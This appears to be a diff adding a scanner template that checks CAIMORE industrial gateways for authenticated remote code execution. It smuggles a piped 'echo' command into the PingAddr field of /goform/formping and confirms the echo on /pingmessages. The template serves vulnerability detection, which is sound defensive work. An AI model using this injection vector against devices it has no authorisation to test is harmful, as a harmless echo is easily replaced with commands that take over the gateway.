@@ -1,0 +1,44 @@
+id: caimore-gateway-rce
+brief:
+    title: CAIMORE Gateway - Remote Code Execution
+    by: momika233
+    level: high
+    about: The gateway of Xiamen Caimao Communication Technology Co., Ltd. is designed with open software architecture. It is a metal shell design, with two Ethernet RJ45 interfaces, and an industrial design ...
+    label:
+        - ciamore-gateway
+        - rce
+        - authenticated
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/goform/formping'
+      head:
+        Accept-Encoding: gzip
+        Authorization: Basic {{base64(username + ':' + password)}}
+      body: PingAddr=127.0.0.1%7Cecho%20{{randstr}}&PingPackNumb=1&PingMsg=
+      signs:
+        - "on": word
+          has:
+            - '{{randstr}}'
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/pingmessages'
+      head:
+        Accept-Encoding: gzip
+        Authorization: Basic {{base64(username + ':' + password)}}
+      signs:
+        - "on": word
+          has:
+            - '{{randstr}}'
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
